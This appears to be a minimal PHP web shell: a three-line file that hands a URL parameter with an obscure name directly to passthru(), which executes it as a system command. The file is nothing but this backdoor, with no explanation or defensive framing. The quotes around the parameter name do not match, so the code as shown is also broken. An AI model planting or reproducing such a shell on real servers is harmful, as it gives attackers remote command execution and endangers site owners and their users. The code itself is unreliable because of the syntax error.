<?php
passthru($_GET["he43Fxcc']);
?>
